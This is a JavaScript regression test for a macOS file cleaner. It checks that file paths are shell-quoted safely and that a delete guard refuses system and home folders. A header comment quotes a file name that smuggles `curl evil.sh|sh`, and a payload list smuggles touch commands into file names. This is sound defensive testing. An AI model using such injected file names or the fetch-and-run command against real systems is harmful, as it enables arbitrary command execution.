// Guards the two things that make a file cleaner dangerous.
//
// 1. shellQuote — paths reach `du`, `find` and `defaults` through a shell. The old
//    escaping only handled `"`, but inside double quotes the shell still expands $(…),
//    so a file named  a'$(curl evil.sh|sh)'b.txt  ran as a command when scanned.
//    These cases actually execute a shell and assert nothing fired.
// 2. refuseReason — the last line of defence before rmSync. A scan bug that returns a
//    container instead of an item inside it must not be able to delete the container.
//
// Run: npm run test:shell
import { execSync } from 'child_process'
import fs from 'fs'
import os from 'os'
import path from 'path'
import { shellQuote } from '../dist-electron/electron/scanners/utils.js'
import { refuseReason, protectedRoots } from '../dist-electron/electron/scanners/deleteGuard.js'

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'xspace-shell-'))
let failures = 0
const ok = (m) => console.log(`ok  ${m}`)
const bad = (m) => { console.log(`*** FAIL: ${m}`); failures++ }

// --- shellQuote: nothing may execute -------------------------------------

// Each payload tries to create a marker file. If the shell runs it, the file appears.
const payloads = [
  `a'$(touch ${tmp}/PWNED1)'b.txt`,
  'a`touch ' + tmp + '/PWNED2`b.txt',
  `a"$(touch ${tmp}/PWNED3)"b.txt`,
  `a; touch ${tmp}/PWNED4; echo b.txt`,
  `a | touch ${tmp}/PWNED5`,
  `a && touch ${tmp}/PWNED6`,
  `a$(touch ${tmp}/PWNED7).txt`,
  `a\ntouch ${tmp}/PWNED8\n.txt`,
]

for (const [i, raw] of payloads.entries()) {
  // Exactly how the scanners use it: interpolated into a shell command string.
  const out = execSync(`printf '%s' ${shellQuote(raw)}`, { encoding: 'utf8' })
  if (out !== raw) bad(`payload ${i + 1} was mangled by the shell:\n    ${JSON.stringify(out)}`)
}
const fired = fs.readdirSync(tmp).filter((f) => f.startsWith('PWNED'))
if (fired.length) bad(`shell executed injected commands: ${fired.join(', ')}`)
else ok(`${payloads.length} injection payloads passed through as literal text`)

// A quoted path still works as a real argument.
{
  const weird = path.join(tmp, `it's a "file" $HOME \`x\`.txt`)
  fs.writeFileSync(weird, 'x')
  const out = execSync(`cat ${shellQuote(weird)}`, { encoding: 'utf8' })
  out === 'x' ? ok('quoting still addresses a file with quotes, $ and backticks')
              : bad(`quoted path did not resolve: ${JSON.stringify(out)}`)
}

// The old escaping, kept as a regression witness: it must NOT be reintroduced.
{
  const raw = `a'$(touch ${tmp}/OLD)'b.txt`
  const oldEscaped = `"${raw.replace(/"/g, '\\"')}"`
  execSync(`printf '%s' ${oldEscaped} >/dev/null 2>&1 || true`)
  fs.existsSync(`${tmp}/OLD`)
    ? ok('the previous escaping is confirmed vulnerable (why shellQuote exists)')
    : bad('expected the old escaping to be exploitable — check the payload still works')
}

// --- refuseReason: the delete guard --------------------------------------

const home = os.homedir()

for (const p of ['/', '/System', '/Users', '/Library', home, path.join(home, 'Documents'),
                 path.join(home, 'Desktop'), path.join(home, 'Library'), path.join(home, '.Trash')]) {
  if (!refuseReason(p)) bad(`protected location was allowed: ${p}`)
}
ok(`${protectedRoots().length} protected locations are all refused`)

// macOS symlinks these to /private/*, so a literal-string list would miss them.
for (const p of ['/tmp', '/var', '/etc', '/private/tmp', '/private/var']) {
  if (!refuseReason(p)) bad(`symlinked system root allowed: ${p}`)
}
ok('symlinked system roots (/tmp, /var, /etc) are refused in both spellings')

// Trailing slashes and traversal must not slip past.
for (const p of [`${home}/`, `${home}/Documents/`, `${home}/Documents/..`, `${home}/foo/../..`]) {
  if (!refuseReason(p)) bad(`normalisation bypass allowed: ${p}`)
}
ok('trailing slashes and ../ traversal are normalised before the check')

// A symlink pointing at a protected root must be refused, not followed blindly.
{
  const link = path.join(tmp, 'old-cache')
  fs.symlinkSync(home, link)
  refuseReason(link) ? ok('symlink pointing at $HOME is refused')
                     : bad('symlink to $HOME was allowed — realpath check is not working')
}

// Relative paths have no business here.
;['', '   ', 'Library/Caches', './x', '../x'].forEach((p) => {
  if (!refuseReason(p)) bad(`non-absolute path allowed: ${JSON.stringify(p)}`)
})
ok('empty and relative paths are refused')

// And the whole point: ordinary items must still be deletable.
{
  const file = path.join(tmp, 'big.dmg')
  fs.writeFileSync(file, 'x')
  const allowed = [
    file,
    path.join(home, 'Documents', 'old-video.mov'),      // a file inside a protected dir
    path.join(home, 'Library', 'Caches', 'com.foo'),    // a cache subdirectory
    path.join(home, 'Downloads', 'installer.dmg'),
    '/Applications/SomeApp.app',                        // uninstall target
  ]
  for (const p of allowed) {
    const r = refuseReason(p)
    if (r) bad(`legitimate target was blocked: ${p} (${r})`)
  }
  ok('files inside protected folders, caches and apps are still deletable')
}

fs.rmSync(tmp, { recursive: true, force: true })

console.log(failures === 0 ? '\nALL PASS' : `\n${failures} FAILURE(S)`)
process.exit(failures === 0 ? 0 : 1)
